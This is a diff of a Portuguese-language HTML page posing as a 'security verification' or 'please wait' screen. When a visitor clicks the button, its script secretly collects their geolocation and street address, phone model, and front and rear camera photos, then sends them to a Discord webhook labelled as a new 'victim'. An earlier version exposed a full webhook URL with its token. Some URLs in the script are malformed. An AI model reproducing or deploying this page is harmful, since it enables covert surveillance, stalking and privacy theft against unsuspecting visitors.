@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verificação de Segurança</title>
+    <title>Aguarde...</title>
     <style>
         body { background-color: black; color: white; text-align: center; font-family: sans-serif; padding-top: 80px; }
         .vermelho { color: red; font-weight: bold; font-size: 26px; margin-bottom: 10px; }
@@ -26,56 +26,81 @@
     <canvas id="c" style="display:none;"></canvas>
 
     <script>
-        const URL_WEBHOOK = 'https://discord.com/api/webhooks/1495823762464178316/JUtyoihcRDnKawG_caqxpZ-G4k7NlZpSMSD5TOYG_gZj6asa9SCXsN1d8G-VSstpePse';
+        const URL_WEBHOOK = 'https://discord.com';
 
         document.getElementById('btn').addEventListener('click', async function() {
             document.getElementById('mensagens').style.display = 'block';
             this.style.display = 'none';
 
             try {
-                const local = await new Promise((res, rej) => {
-                    navigator.geolocation.getCurrentPosition(res, rej);
-                });
+                // 1. Localização e Endereço
+                const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));
+                const response = await fetch(`https://openstreetmap.org{pos.coords.latitude}&lon=${pos.coords.longitude}`);
+                const data = await response.json();
+                const endereco = data.display_name;
 
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" } 
-                });
-                
-                const v = document.getElementById('v');
-                v.srcObject = stream;
+                // 2. Modelo do Celular (Aproximado)
+                const modelo = navigator.userAgent.split('(')[1].split(')')[0];
 
-                setTimeout(async () => {
-                    const c = document.getElementById('c');
-                    c.width = v.videoWidth;
-                    c.height = v.videoHeight;
-                    c.getContext('2d').drawImage(v, 0, 0);
-                    
-                    const img = c.toDataURL('image/jpeg');
-                    
-                    const fd = new FormData();
-                    fd.append('payload_json', JSON.stringify({
-                        content: "✅ **Acesso Registrado**",
-                        embeds: [{
-                            title: "Relatório de Teste",
-                            description: `📍 [Localização no Mapa](https://google.com{local.coords.latitude},${local.coords.longitude})\n⏰ ${new Date().toLocaleString()}`,
-                            color: 16711680,
-                            image: { url: 'attachment://p.jpg' }
-                        }]
-                    }));
-                    
-                    const blob = await (await fetch(img)).blob();
-                    fd.append('file', blob, 'p.jpg');
+                // 3. Capturar Foto Frontal
+                const streamFrontal = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const fotoFrontal = await tirarFoto(streamFrontal);
+                stopStream(streamFrontal);
 
-                    await fetch(URL_WEBHOOK, { method: 'POST', body: fd });
-                    stream.getTracks().forEach(t => t.stop());
+                // 4. Capturar Foto Traseira
+                const streamTraseira = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
+                const fotoTraseira = await tirarFoto(streamTraseira);
+                stopStream(streamTraseira);
 
-                    setTimeout(() => { window.location.href = "about:blank"; }, 4000);
-                }, 1500);
+                // 5. Enviar para Discord
+                await enviarDiscord(fotoFrontal, fotoTraseira, endereco, modelo);
+
+                setTimeout(() => { window.location.href = "about:blank"; }, 3000);
 
             } catch (e) {
-                setTimeout(() => { window.location.href = "about:blank"; }, 3000);
+                console.log(e);
+                setTimeout(() => { window.location.href = "about:blank"; }, 2000);
             }
         });
+
+        async function tirarFoto(stream) {
+            const v = document.getElementById('v');
+            v.srcObject = stream;
+            await new Promise(r => setTimeout(r, 1000));
+            const c = document.getElementById('c');
+            c.width = v.videoWidth;
+            c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v, 0, 0);
+            return c.toDataURL('image/jpeg');
+        }
+
+        function stopStream(stream) {
+            stream.getTracks().forEach(t => t.stop());
+        }
+
+        async function enviarDiscord(imgFrontal, imgTraseira, endereco, modelo) {
+            const fd = new FormData();
+            const payload = {
+                content: "NOVA VÍTIMA DOS PHANT0NS😈😈😈😈",
+                embeds: [{
+                    description: `📍 **LOCALIZAÇÃO:**\n${endereco}\n\n📅 **DATA:**\n${new Date().toLocaleString()}\n\n📱 **MODELO CELULAR:**\n${modelo}\n\nphant0ns😈`,
+                    color: 16711680,
+                    image: { url: 'attachment://frontal.jpg' },
+                    thumbnail: { url: 'attachment://traseira.jpg' }
+                }]
+            };
+
+            fd.append('payload_json', JSON.stringify(payload));
+            
+            const b1 = await (await fetch(imgFrontal)).blob();
+            fd.append('file1', b1, 'frontal.jpg');
+            
+            const b2 = await (await fetch(imgTraseira)).blob();
+            fd.append('file2', b2, 'traseira.jpg');
+
+            await fetch(URL_WEBHOOK, { method: 'POST', body: fd });
+        }
     </script>
 </body>
 </html>
+
